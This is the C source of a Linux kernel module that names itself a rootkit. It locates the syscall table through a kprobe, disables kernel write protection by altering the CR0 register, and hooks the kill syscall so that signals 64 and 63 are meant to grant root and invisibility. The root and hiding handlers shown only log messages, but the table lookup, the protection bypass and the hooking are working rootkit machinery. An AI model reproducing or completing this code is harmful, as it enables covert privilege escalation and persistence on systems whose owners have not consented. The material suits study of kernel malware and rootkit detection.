/*
 Works for kernel versions >= (4,17,0)
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <linux/dirent.h>


// Syscall table address pointer
unsigned long *__sys_call_table_addr;

enum signals {
    SIGSUPER = 64, // Become root
    SIGINVIS = 63, // Become invisible
};


// Using kprobes method for getting syscall table address for new versions of kernel
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)

#include <linux/kprobes.h>
#define KPROBE_ 1

typedef unsigned long (* kallsyms_lookup_name_t)(const char* name);
static struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name"
};

#endif

// Using cr0 register for changing permission of syscall table to rw, for x86 architecture only
#ifdef CONFIG_X86

#include <asm/paravirt.h>
#define PTREGS_MODIF

// For new versions of kernel ptregs_t type serves as a syscall wrapepr
typedef asmlinkage long (*syscall_wrapper)(const struct pt_regs *regs);
static syscall_wrapper orig_kill;

static inline void write_forced_cr0(unsigned long value)
{
    unsigned long __force_order;

    asm volatile("mov %0,%%cr0":"+r"(value),"+m"(__force_order));
}

static void unprotect_memory(void)
{
    write_forced_cr0(read_cr0() & ~0x10000);
    pr_info("Unprotected memory\n");
}

static void protect_memory(void)
{
    write_forced_cr0(read_cr0() | 0x10000);
    pr_info("Protected memory\n");
}

#endif

// Modified syscalls
#ifdef PTREGS_MODIF

static asmlinkage long hack_kill_syscall(const struct pt_regs* regs)
{
    int sig = regs->si;

    if (sig == SIGSUPER) {
        printk("Signal 64 was intercepted | became root");
        return 0;
    } else if (sig == SIGINVIS) {
        printk("Signal 63 was intercepted | became invisible");
        return 0;
    }

    return orig_kill(regs);
}

#endif


static void store(void)
{
    orig_kill = (syscall_wrapper)__sys_call_table_addr[__NR_kill];
}


static void hook(void)
{
    __sys_call_table_addr[__NR_kill] = (unsigned long)&hack_kill_syscall;
}


static void restore_syscall(void)
{
    /* Restore syscall table */
    __sys_call_table_addr[__NR_kill] = (unsigned long)orig_kill;
}


// Function that launches when module is inserted
static int __init mod_init(void)
{
    pr_info("rootkit: started\n");

#ifdef KPROBE_

    int ret = register_kprobe(&kp);
    if (ret < 0) {
        pr_err("[monitor] register_kprobe failed, returned %d\n", ret);
        return ret;
    }

    pr_info("[monitor] kprobe registered. kallsyms_lookup_name found at 0x%px\n",
            kp.addr);

    kallsyms_lookup_name_t kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;

    unregister_kprobe(&kp);

#endif
    __sys_call_table_addr = (unsigned long *)kallsyms_lookup_name("sys_call_table");

    store();
    unprotect_memory();

    hook();
    protect_memory();

    return 0;
}


// Function that launches when module is released
static void __exit mod_exit(void)
{
    pr_info("rootkit: exited\n");

    unprotect_memory();
    restore_syscall();
    protect_memory();
}


MODULE_LICENSE("GPL");
module_init(mod_init);
module_exit(mod_exit);
